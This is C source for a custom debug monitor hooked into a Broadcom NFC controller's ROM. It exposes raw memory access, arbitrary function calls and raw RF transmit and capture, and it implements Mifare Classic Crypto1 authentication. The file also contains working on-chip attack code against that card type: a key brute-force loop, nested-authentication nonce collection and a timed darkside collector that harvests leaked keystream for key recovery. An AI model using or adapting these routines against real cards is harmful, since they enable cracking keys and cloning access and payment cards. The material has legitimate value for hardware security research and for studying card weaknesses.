// Chip-side debug monitor (BCM20791B5): memory read/write and function calls as a vendor
// NCI command, answered with a proper response.
//
// The ROM's NCI command dispatcher (0x189A2) calls the function pointer at RAM 0x38718 (if
// set, never written by the ROM) with every command that passed the OID range check; a
// nonzero return means the command was consumed. We take 2F 2C (unimplemented in ROM):
//   2F 2C | op u8 | addr u32 | ...
//   op 0 READ8    len u8                -> 4F 2C | 00 | len bytes
//   op 1 WRITE8   data...               -> 4F 2C | 00
//   op 2 CALL     r0 r1 r2 r3 (u32 each) -> 4F 2C | 00 | r0 u32   (addr = function, Thumb bit added)
//   op 3 READ32   len u8 (words)        -> 4F 2C | 00 | len*4 bytes, 32-bit loads (for MMIO)
//   op 4 WRITE32  words...              -> 4F 2C | 00, 32-bit stores
//   op 5 CAPTURE  on u8                 -> 4F 2C | 00 | ring address u32 | irq log address u32
//   op 6 TXRAW    r570 r574 r568 r55c (u8 each), data... -> 4F 2C | 00
//                 the ROM's bit-mode TX (0x11DE + 0x1280) with every register value given:
//                 cmd 0x5C56C = 1, 0x5C570/574/568 framing (568 = bytes << 4 | bits),
//                 TX mode 0x5C55C, then the data into the TX byte port 0x5C600 (the FIFO takes
//                 a whole frame, no pacing needed)
//   op 7 AUTH     key[6] uid u32 nr u32 (big-endian, as on the wire) code u8, AUTH frame...
//                 (addr = r574 << 8 | length code for the 72-bit {nr}{ar} frame; 0 = 0x178)
//                 -> 4F 2C | 00 | nt u32 | cipher odd u32 | even u32   (02 = no nt)
//                 Mifare Classic reader auth with the card's timing: TX the given (parity-packed)
//                 AUTH frame, wait for nt in the capture ring, answer {nr}{ar} right away. The
//                 host must have parity off (0x5C560 = 8) and capture on; it reads {at} from the
//                 ring and continues the session with the returned cipher state.
//   op 8 TXSCHED  r570 r574 r568 r55c (u8 each), n u8, n * (delay u16, reg u32, val u32), data...
//                 -> 4F 2C | 00 | TX busy ticks u32
//                 TXRAW, then the n stores, each `delay` timer ticks after the last FIFO write
//                 (ascending), interrupts off until TX busy (0x5C594 bit 0) clears. Used to
//                 toggle parity (0x5C560) per byte inside one frame: mixed-parity frames carry
//                 the 162-bit encrypted WRITE data frame (docs/NOTES.md).
// Errors answer 4F 2C | 01.
//
// CAPTURE takes the framer's TX/RX interrupt group away from the ROM: the framer ISR (0x197E)
// reads that group's status from 0x5C5D0 (write-1-clear) and passes it through the RAM filter
// *(0x380D8) before acting on it (bit 4 = RX done -> 0x1372, bit 5 = TX done -> RF state
// machine). Our filter records RX-done frames (status registers + the RX FIFO, byte port
// 0x5C620) into a ring the host reads with READ8, and returns 0, so the ROM's state machine
// never sees our raw exchanges and doesn't time out and re-poll. Interrupt context: RAM only.
typedef unsigned int u32;
typedef int s32;
typedef short s16;
typedef unsigned char u8;

#define CMD_HOOK  (*(volatile u32 *)0x38718)
#define SEND_HOOK (*(volatile u32 *)0x38714) // 0x188E4 calls it with every NCI packet it sends
#define OID_DEBUG 0x2C
#define MAX_DATA  0xF0

#define ROM_FN(addr, type) ((type)((addr) | 1))
#define nci_alloc ROM_FN(0x188C2, u8 *(*)(u32 total_len, u32 mt)) // [hdr 3][payload], len set
#define nci_send  ROM_FN(0x188E4, void (*)(u8 *pkt))

#define RF_FILTER   (*(volatile u32 *)0x380D4) // group 0x5C5C4 (ISR bit 2, handler 0x15F2)
#define TXRX_FILTER (*(volatile u32 *)0x380D8) // group 0x5C5D0 (ISR bit 1, handler 0x1736)
#define TMR_FILTER  (*(volatile u32 *)0x380DC) // group 0x5C5DC (ISR bit 0, handler 0x18FE)
#define TIMER       (*(volatile u32 *)0x5E024) // free-running counter (ROM 0x1C56)
#define TXRX_RX_DONE 0x10
#define REG(a)    (*(volatile u32 *)(a))
#define RX_PORT   (*(volatile u8 *)0x5C620)
#define TX_PORT   (*(volatile u8 *)0x5C600)

#define irq_save    ROM_FN(0xC5C, u32 (*)(void))
#define irq_restore ROM_FN(0xC64, void (*)(u32))

enum { OP_READ8, OP_WRITE8, OP_CALL, OP_READ32, OP_WRITE32, OP_CAPTURE, OP_TXRAW, OP_AUTH, OP_TXSCHED, OP_NESTED, OP_SNAP, OP_CHKKEYS, OP_DARKSIDE };

// Captured frames: regs = TX/RX status (0x5C5D0), 0x5C588, 0x5C58C, 0x5C598, 0x5C5A0 (RX bytes).
#define N_FRAMES   8
#define FRAME_DATA 36 // room for a GTU config read (32 + CRC)
struct frame {
	u32 seq; // 0 = empty
	u32 regs[5];
	u8 len;  // bytes popped
	u8 data[FRAME_DATA];
	u8 pad[3];
};
static struct {
	u32 count; // frames captured so far; frame i is in ring[(i - 1) % N_FRAMES], seq = i
	struct frame ring[N_FRAMES];
} capture;
static u8 capturing;

// The RF and timer interrupt groups: pass the status through unchanged (identity filter), the same
// as the ROM would. (The per-interrupt trace that once lived here, and OP_CAPTURE's pointer to it,
// were removed to make room.)
static u32 pass_filter(u32 status)
{
	return status;
}

int init(void);

__attribute__((section(".entry"), used)) int (*const entry)(void) = init;

static u32 get32(const u8 *p)
{
	return p[0] | (p[1] << 8) | (p[2] << 16) | ((u32)p[3] << 24);
}

static u32 get32be(const u8 *p)
{
	return (u32)p[0] << 24 | p[1] << 16 | p[2] << 8 | p[3];
}

static void put32(u8 *p, u32 v)
{
	for (int i = 0; i < 4; i++) p[i] = v >> (8 * i);
}

static void reply(u32 status, const u8 *data, u32 len)
{
	u8 *pkt = nci_alloc(3 + 1 + len, 2);
	if (!pkt) return;
	pkt[0] |= 0xF;
	pkt[1] = OID_DEBUG;
	pkt[3] = status;
	for (u32 i = 0; i < len; i++) pkt[4 + i] = data[i];
	nci_send(pkt);
}

static u32 txrx_filter(u32 status)
{
	if (!capturing) return status;
	if (!(status & TXRX_RX_DONE)) return 0;
	struct frame *f = &capture.ring[capture.count % N_FRAMES];
	static const u32 regs[5] = { 0, 0x5C588, 0x5C58C, 0x5C598, 0x5C5A0 };
	f->regs[0] = status;
	for (int i = 1; i < 5; i++) f->regs[i] = REG(regs[i]);
	u32 n = f->regs[4];
	if (n > FRAME_DATA) n = FRAME_DATA;
	for (u32 i = 0; i < n; i++) f->data[i] = RX_PORT;
	f->len = n;
	f->seq = ++capture.count;
	return 0;
}

// The ROM's bit-mode TX with every register value given (see OP_TXRAW). Returns with
// interrupts off; the caller hands the result to irq_restore.
static u32 txstart(u32 r570, u32 r574, u32 code, u32 r55c, const u8 *data, u32 len)
{
	// After an RX the framer must get cmd 1 some time before the next TX setup, or the TX
	// hangs the chip (writing it from the RX interrupt is too early).
	REG(0x5C56C) = 1;
	for (u32 t0 = TIMER; t0 - TIMER < 50;) // ~1 MHz down-counter
		;
	u32 irq = irq_save();
	REG(0x5C56C) = 1;
	REG(0x5C570) = r570;
	REG(0x5C574) = r574;
	REG(0x5C568) = code;
	REG(0x5C55C) = r55c;
	for (u32 i = 0; i < len; i++) TX_PORT = data[i];
	return irq;
}

static void txraw(u32 r570, u32 r574, u32 code, u32 r55c, const u8 *data, u32 len)
{
	irq_restore(txstart(r570, r574, code, r55c, data, len));
}

// See OP_TXSCHED; sched = n * (delay u16, reg u32, val u32).
static u32 txsched(const u8 *a, const u8 *sched, u32 n, const u8 *data, u32 len)
{
	u32 irq = txstart(a[0], a[1], a[2], a[3], data, len), t = TIMER, busy = 0;
	while (t - TIMER < 30000) {
		if (n && t - TIMER >= (u32)(sched[0] | sched[1] << 8)) {
			REG(get32(sched + 2)) = get32(sched + 6);
			sched += 10;
			n--;
		}
		if (!n && !(REG(0x5C594) & 1)) {
			busy = t - TIMER;
			break;
		}
	}
	irq_restore(irq);
	return busy;
}

// Crypto1, crapto1's reference form (odd/even LFSR halves); tools/crypto1.py is the same.
// Derived from crapto1 (C) 2008-2014 bla <blapost@gmail.com> and the Proxmark3 contributors, GPL; see CREDITS.md.
static u32 c1_odd, c1_even;

static u32 parity(u32 x)
{
	x ^= x >> 16;
	x ^= x >> 8;
	x ^= x >> 4;
	x ^= x >> 2;
	return (x ^ x >> 1) & 1;
}

static u32 c1_filter(void)
{
	u32 x = c1_odd, f;
	f = 0xf22c0 >> (x & 0xf) & 16;
	f |= 0x6c9c0 >> (x >> 4 & 0xf) & 8;
	f |= 0x3c8b0 >> (x >> 8 & 0xf) & 4;
	f |= 0x1e458 >> (x >> 12 & 0xf) & 2;
	f |= 0x0d938 >> (x >> 16 & 0xf) & 1;
	return 0xEC57E80A >> f & 1;
}

static u32 c1_bit(u32 in)
{
	u32 ret = c1_filter();
	u32 t = c1_odd;
	c1_odd = (c1_even << 1 | parity(in ^ (0x29CE5C & c1_odd) ^ (0x870804 & c1_even))) & 0xFFFFFF;
	c1_even = t;
	return ret;
}

static u32 c1_byte(u32 in)
{
	u32 ret = 0;
	for (int i = 0; i < 8; i++) ret |= c1_bit(in >> i & 1) << i;
	return ret;
}

static u32 swap32(u32 x)
{
	return x >> 24 | (x >> 8 & 0xFF00) | (x << 8 & 0xFF0000) | x << 24;
}

static u32 prng_successor(u32 x, int n)
{
	x = swap32(x);
	while (n--) x = x >> 1 | (x >> 16 ^ x >> 18 ^ x >> 19 ^ x >> 21) << 31;
	return swap32(x);
}

static u32 getbit(const u8 *p, u32 i)
{
	return p[i >> 3] >> (i & 7) & 1;
}

static void putbit(u8 *p, u32 i, u32 v)
{
	p[i >> 3] |= v << (i & 7);
}

// Decode the plaintext tag nonce from the last captured frame (the RX stream continues at bit 4,
// after the 36-bit AUTH frame). 0 if the frame is too short.
static int recv_nt(u32 *nt_out)
{
	struct frame *f = &capture.ring[(*(volatile u32 *)&capture.count - 1) % N_FRAMES];
	if (f->len < 5) return 0;
	u32 nt = 0;
	for (u32 j = 0; j < 4; j++)
		for (u32 k = 0; k < 8; k++) nt |= getbit(f->data, 4 + 9 * j + k) << (24 - 8 * j + k);
	*nt_out = nt;
	return 1;
}

// Reader side of the 3-pass auth (first auth, plaintext nt). Returns 0 if no nt came back.
static int auth(const u8 *key, u32 uid, u32 nr, u32 code, const u8 *frame, u32 len, u32 nrar_tx, u32 *nt_out)
{
	u32 seen = capture.count;
	txraw(0, 1, code, 0x88, frame, len);
	for (u32 t0 = TIMER; *(volatile u32 *)&capture.count == seen;) // set by the RX interrupt
		if (t0 - TIMER > 20000) return 0;
	if (!recv_nt(nt_out)) return 0;
	u32 nt = *nt_out;
	c1_odd = c1_even = 0;
	for (int i = 47; i > 0; i -= 2) { // key as a 48-bit big-endian number
		u32 o = (i - 1) ^ 7, e = i ^ 7;
		c1_odd = c1_odd << 1 | (key[5 - (o >> 3)] >> (o & 7) & 1);
		c1_even = c1_even << 1 | (key[5 - (e >> 3)] >> (e & 7) & 1);
	}
	u32 un = uid ^ nt;
	for (u32 i = 0; i < 32; i++) c1_bit(un >> (i ^ 24) & 1);
	// {nr}{ar}: 8 bytes, each followed by its encrypted parity bit
	static u8 out[9];
	for (int i = 0; i < 9; i++) out[i] = 0;
	u32 ar = prng_successor(nt, 64);
	for (u32 i = 0; i < 8; i++) {
		u32 b = i < 4 ? nr >> (24 - 8 * i) & 0xFF : ar >> (56 - 8 * i) & 0xFF;
		u32 c = c1_byte(i < 4 ? b : 0) ^ b;
		for (u32 k = 0; k < 8; k++) putbit(out, 9 * i + k, c >> k & 1);
		putbit(out, 9 * i + 8, c1_filter() ^ 1 ^ parity(b));
	}
	txraw(0, nrar_tx >> 8 & 0xFF, nrar_tx & 0xFF, 0x88, out, 9);
	return 1;
}

// OP_CHKKEYS: Mifare Classic key check, pm3 fchk style: per key a whole HLTA / WUPA / SELECT / AUTH
// / {nr}{ar} and the {at} check here, so a key costs RF time only, not monitor round trips.
#define PARITY_REG 0x5C560
#define PARITY_OFF 0x08

static void delay(u32 ticks)
{
	for (u32 t0 = TIMER; t0 - TIMER < ticks;)
		;
}

static int wait_rx(u32 seen, u32 ticks)
{
	for (u32 t0 = TIMER; *(volatile u32 *)&capture.count == seen;)
		if (t0 - TIMER > ticks) return 0;
	return 1;
}

// Run the re-select frames (HLTA / WUPA / SELECT, parity on); 1 if the card selected, 0 if a step
// that expects an answer got none. steps: nsteps * (r574, code, rx(0/1), len, bytes).
static int send_steps(const u8 *steps, u32 ns)
{
	const u8 *s = steps;
	for (u32 st = 0; st < ns; st++, s += 4 + s[3]) {
		u32 seen = capture.count;
		txraw(0, s[0], s[1], 0x88, s + 4, s[3]);
		if (!s[2]) delay(800); // HLTA: no answer, let it go out
		else if (!wait_rx(seen, 5000)) return 0;
	}
	return 1;
}

// Past the re-select steps (see send_steps) of a host-built arg.
static const u8 *skip_steps(const u8 *q, u32 ns)
{
	while (ns--) q += 4 + q[3];
	return q;
}

// arg: uid(4 BE) nr(4 BE) at_wait(u16 LE, timer ticks) nsteps(u8), per step: r574 code rx(0/1) len
// bytes (parity on); then auth code, auth len, auth frame (parity off), nkeys, keys[6]. Returns the
// index of the key whose {at} checked out (0xFF = none), keys tried, keys the card didn't select for.
static u32 chkkeys(const u8 *arg, u32 n, u32 nrar, u8 *out)
{
	const u8 *end = arg + n, *steps = arg + 11;
	if (n < 11) return 0;
	u32 uid = get32be(arg), nr = get32be(arg + 4), atw = arg[8] | arg[9] << 8, ns = arg[10];
	const u8 *q = skip_steps(steps, ns);
	if (q + 2 > end || q + 2 + q[1] + 1 > end) return 0;
	u32 acode = q[0], alen = q[1];
	const u8 *aframe = q + 2;
	q += 2 + alen;
	u32 nk = q[0], hit = 0xFF, nosel = 0, i;
	const u8 *keys = q + 1;
	if (keys + 6 * nk > end) return 0;
	for (i = 0; i < nk && hit == 0xFF; i++) {
		REG(PARITY_REG) = 0;
		if (!send_steps(steps, ns)) {
			nosel++;
			continue;
		}
		REG(PARITY_REG) = PARITY_OFF;
		u32 nt;
		if (!auth(keys + 6 * i, uid, nr, acode, aframe, alen, nrar, &nt)) {
			nosel++;
			continue;
		}
		u32 seen = capture.count;
		if (!wait_rx(seen, atw)) continue; // wrong key: the card stays silent
		// volatile: the compiler would reuse the count from before the wait (the nt frame)
		struct frame *f = &capture.ring[(*(volatile u32 *)&capture.count - 1) % N_FRAMES];
		if (f->len < 4) continue;
		u32 at = 0;
		for (u32 j = 0; j < 4; j++) {
			u32 b = 0;
			for (u32 k = 0; k < 8; k++) b |= getbit(f->data, 9 * j + k) << k;
			at |= (b ^ c1_byte(0)) << (24 - 8 * j);
		}
		if (at == prng_successor(nt, 96)) hit = i;
	}
	REG(PARITY_REG) = 0;
	out[0] = hit;
	out[1] = i;
	out[2] = nosel;
	return 3;
}

// A clock that counts up (TIMER is a free-running down-counter), so each AUTH can be fired at an
// absolute time the way pm3 schedules on GetCountSspClk.
#define NOW() ((u32)(0u - TIMER))

// OP_DARKSIDE: darkside runs (docs/NOTES.md, issue #2). The card leaks a 4-bit encrypted NACK to a wrong
// {nr}{ar} regardless of parity (always-leak). Its PRNG free-runs, so the tag nonce is a function of
// when the AUTH arrives. AUTHs fire on an absolute grid `sync` ticks apart, a PRNG period (host-
// calibrated) over nslot: slot i takes every nslot-th grid point, so each slot sees its own nonce once
// a period and collects its own run. Steered like pm3's: a slot locks onto its first nonce, and when
// another comes back within DS_WIN steps of it, moves its own fires by that many steps (phase); an
// eighth of it goes into the per-fire correction all slots share (the drift the integer grid leaves).
// On the locked nonce, send a fixed {nr}{ar} for the slot's next missing nt_diff (top 3 bits of nr byte
// 3) and record its NACK keystream. The host intersects the runs (crapto1_darkside). {nr}{ar} uses
// auth()'s nrar framing.
#define DS_WIN   48
#define DS_SLOTS 8

struct dslot {
	u32 target; // the locked nonce (the first one the slot saw)
	s32 ph;     // the slot's phase, ticks * 256
	u8 ks[8], mask, hits, lost, pad;
};

// arg: sync(u32 LE) sfracq(s16 LE, per-fire grid correction * 256) maxiter(u16 LE) atw(u16 LE, NACK
// wait ticks) tq(u16 LE, ticks per PRNG step * 256) nslot(u8) need(u8, slots to complete) nsteps(u8),
// per step r574 code rx(0/1) len bytes (parity on); acode(u8) alen(u8) aframe[alen] (AUTH, parity
// off); 8 * nrar[9] (parity off, nt_diff 0..7). Returns struct dslot per slot (ks: low nibble each;
// mask: a bit per filled nt_diff, 0xFF = complete). Unsteered with 2 slots, the two targets are two
// nonces a grid point apart: the host's period calibration.
static u32 darkside(const u8 *arg, u32 n, u32 nrar_tx, struct dslot *ds)
{
	const u8 *end = arg + n;
	if (n < 15) return 0;
	u32 sync = get32(arg);
	s32 sfr = (s16)(arg[4] | arg[5] << 8);
	u32 maxiter = arg[6] | arg[7] << 8, atw = arg[8] | arg[9] << 8, tq = arg[10] | arg[11] << 8;
	u32 nslot = arg[12], need = arg[13], ns = arg[14];
	const u8 *steps = arg + 15, *q = skip_steps(steps, ns);
	u32 acode = q[0], alen = q[1];
	const u8 *aframe = q + 2;
	q += 2 + alen;
	const u8 *nrar = q;
	// host builds a well-formed arg; just guard the frame reads
	if (nrar + 9 * 8 > end || !nslot || nslot > DS_SLOTS) return 0;

	for (u32 i = 0; i < nslot * sizeof *ds; i++) ((u8 *)ds)[i] = 0;
	u32 done = 0, slot = -1; // the first grid point is slot 0
	u32 fire = NOW() + sync;
	s32 facc = 0;
	for (u32 iters = 0; iters < maxiter && done < need; iters++) {
		REG(PARITY_REG) = 0;
		if (!send_steps(steps, ns)) continue;
		// Fire on the absolute grid (the nonce depends on timing only, not on how long the re-select
		// took): sync plus the fractional correction; the next grid point (slot) if the re-select
		// overran.
		fire += sync;
		slot++;
		facc += sfr;
		s32 cr = facc >> 8;
		fire += cr;
		facc -= cr << 8;
		while ((s32)(fire - (NOW() + 32)) < 0) fire += sync, slot++;
		while (slot >= nslot) slot -= nslot; // no divide on the M0
		struct dslot *d = &ds[slot];
		u32 t = fire + (d->ph >> 8);
		while ((s32)(NOW() - t) < 0)
			;
		REG(PARITY_REG) = PARITY_OFF;
		u32 seen = capture.count, nt;
		txraw(0, 1, acode, 0x88, aframe, alen);
		if (!wait_rx(seen, 20000) || !recv_nt(&nt)) continue;
		if (!d->target) d->target = nt;
		// The card's clock stops in the reader's modulation pauses, so every frame sent costs PRNG
		// steps (~180 for {nr}{ar}): send {nr}{ar} every time, on target or not, and keep firing the
		// slots that are complete, to keep the per-fire advance the same. A fixed {nr}{ar} for the next
		// missing nt_diff c (fake parity).
		u32 c = 0;
		while (c < 7 && d->mask >> c & 1) c++;
		u32 s2 = capture.count;
		txraw(0, nrar_tx >> 8 & 0xFF, nrar_tx & 0xFF, 0x88, nrar + 9 * c, 9);
		u32 got = wait_rx(s2, atw);
		if (d->mask == 0xFF) continue;
		if (nt == d->target) {
			d->lost = 0;
			d->hits++;
			if (got) { // the NACK ^ 0x05 is the keystream nibble
				struct frame *f = &capture.ring[(*(volatile u32 *)&capture.count - 1) % N_FRAMES];
				if (f->len >= 1) {
					d->ks[c] = (f->data[0] & 0xF) ^ 0x5;
					if ((d->mask |= 1 << c) == 0xFF) done++;
				}
			}
			continue;
		}
		// steps from the target to nt (+ = fired late), within DS_WIN
		s32 dd = 0;
		u32 x = d->target, y = nt;
		for (s32 i = 1; i <= DS_WIN && !dd; i++) {
			x = prng_successor(x, 1), y = prng_successor(y, 1);
			if (x == nt) dd = i;
			if (y == d->target) dd = -i;
		}
		if (!dd) { // lost it: after a few, lock onto where the nonce is now
			if (++d->lost > 3) d->target = nt, d->mask = 0, d->lost = 0;
			continue;
		}
		d->lost = 0;
		s32 cc = dd * (s32)tq;
		d->ph -= cc;
		sfr -= cc >> 3;
	}
	REG(PARITY_REG) = 0;
	return nslot * sizeof *ds;
}

// (OP_SNAP, the framer snapshot used once for NFC-V exploration, was removed to make room for the
// darkside timed-sync collector. docs/NOTES.md keeps the framer dumps it produced; re-add from git if
// another technology needs one.)

__attribute__((noinline)) static int hook(u8 *msg)
{
	if ((msg[0] & 0xF) != 0xF || (msg[1] & 0x3F) != OID_DEBUG) return 0;
	u32 len = msg[2];
	const u8 *p = msg + 3;
	if (len < 5) {
		reply(1, 0, 0);
		return 1;
	}
	u32 addr = get32(p + 1), n = len - 5;
	const u8 *arg = p + 5;
	// not on the stack: the NCI task stack size is unknown; aligned for OP_DARKSIDE's structs
	static u8 buf[MAX_DATA] __attribute__((aligned(4)));

	switch (p[0]) {
	case OP_READ8:
		if (n < 1 || arg[0] > MAX_DATA) break;
		for (u32 i = 0; i < arg[0]; i++) buf[i] = ((volatile u8 *)addr)[i];
		reply(0, buf, arg[0]);
		return 1;
	case OP_WRITE8:
		for (u32 i = 0; i < n; i++) ((volatile u8 *)addr)[i] = arg[i];
		reply(0, 0, 0);
		return 1;
	case OP_CALL: {
		if (n < 16) break;
		u32 r = ((u32 (*)(u32, u32, u32, u32))(addr | 1))(get32(arg), get32(arg + 4), get32(arg + 8), get32(arg + 12));
		put32(buf, r);
		reply(0, buf, 4);
		return 1;
	}
	case OP_READ32:
		if (n < 1 || arg[0] > MAX_DATA / 4 || addr & 3) break;
		for (u32 i = 0; i < arg[0]; i++) put32(buf + 4 * i, ((volatile u32 *)addr)[i]);
		reply(0, buf, arg[0] * 4);
		return 1;
	case OP_WRITE32:
		if (n & 3 || addr & 3) break;
		for (u32 i = 0; i < n / 4; i++) ((volatile u32 *)addr)[i] = get32(arg + 4 * i);
		reply(0, 0, 0);
		return 1;
	case OP_CAPTURE:
		if (n < 1) break;
		capturing = arg[0];
		TXRX_FILTER = (u32)txrx_filter;
		RF_FILTER = (u32)pass_filter;
		TMR_FILTER = (u32)pass_filter;
		put32(buf, (u32)&capture);
		reply(0, buf, 4);
		return 1;
	case OP_TXRAW:
		if (n < 4) break;
		txraw(arg[0], arg[1], arg[2], arg[3], arg + 4, n - 4);
		reply(0, 0, 0);
		return 1;
	case OP_AUTH: {
		if (n < 15) break;
		u32 nt;
		if (!auth(arg, get32be(arg + 6), get32be(arg + 10), arg[14], arg + 15, n - 15, addr & 0xFFFF ? addr & 0xFFFF : 0x178, &nt)) {
			reply(2, 0, 0);
			return 1;
		}
		put32(buf, nt);
		put32(buf + 4, c1_odd);
		put32(buf + 8, c1_even);
		reply(0, buf, 12);
		return 1;
	}
	case OP_NESTED: {
		// arg: key[6] uid(4 BE) nr(4 BE) code(u8) nested-cmd plaintext[4] | auth1 frame...
		// Does auth1 on-chip, waits for {at}, then sends the nested AUTH command (encrypted with the
		// session cipher) at fixed cycles so the PRNG distance nt0->nt_T is stable. Returns nt0; the
		// host reads the encrypted nested nonce from the capture ring.
		if (n < 19) break;
		u32 nt0;
		if (!auth(arg, get32be(arg + 6), get32be(arg + 10), arg[14], arg + 19, n - 19,
			addr & 0xFFFF ? addr & 0xFFFF : 0x178, &nt0)) {
			reply(2, 0, 0);
			return 1;
		}
		u32 seen = capture.count; // wait for {at}, then advance the cipher past it
		for (u32 t0 = TIMER; *(volatile u32 *)&capture.count == seen;)
			if (t0 - TIMER > 20000) { reply(3, 0, 0); return 1; }
		for (int i = 0; i < 32; i++) c1_bit(0);
		static u8 nf[5];
		for (int i = 0; i < 5; i++) nf[i] = 0;
		for (int i = 0; i < 4; i++) { // encrypt the 4-byte nested command with encrypted parity
			u32 b = arg[15 + i], c = c1_byte(0) ^ b;
			for (int k = 0; k < 8; k++) putbit(nf, 9 * i + k, c >> k & 1);
			putbit(nf, 9 * i + 8, c1_filter() ^ 1 ^ parity(b));
		}
		txraw(0, 1, 0x44, 0x88, nf, 5);
		put32(buf, nt0);
		reply(0, buf, 4);
		return 1;
	}
	case OP_CHKKEYS: {
		u32 r = chkkeys(arg, n, addr & 0xFFFF ? addr & 0xFFFF : 0x178, buf);
		if (!r) break;
		reply(0, buf, r);
		return 1;
	}
	case OP_DARKSIDE: {
		u32 r = darkside(arg, n, addr & 0xFFFF ? addr & 0xFFFF : 0x178, (struct dslot *)buf);
		if (!r) break;
		reply(0, buf, r);
		return 1;
	}
	case OP_TXSCHED:
		if (n < 5 || n < 5u + 10 * arg[4]) break;
		put32(buf, txsched(arg, arg + 5, arg[4], arg + 5 + 10 * arg[4], n - 5 - 10 * arg[4]));
		reply(0, buf, 4);
		return 1;
	}
	reply(1, 0, 0);
	return 1;
}

#define AON     __attribute__((section(".aon"), noinline)) // code in the AON RAM (link.ld): no room in the image
#define REARM_CODE AON
#define REARM_VAR  __attribute__((section(".aon.var")))
#define DISC_VAR   __attribute__((section(".data.disc")))
#include "rearm.h"

AON static int cmd_hook(u8 *msg)
{
	rearm_cmd(msg);
	return hook(msg);
}

AON static void hooks_on(void)
{
	CMD_HOOK = (u32)cmd_hook;
	RF_EVT_HOOK = (u32)rf_hook;
}

// The ROM treats a nonzero return as failure; code must start right after the entry word.
__attribute__((section(".text.init"))) int init(void)
{
	extern u32 __bss_start[], __bss_end[];
	for (u32 *p = __bss_start; p < __bss_end; p++) *p = 0;
	hooks_on();
	return 0;
}
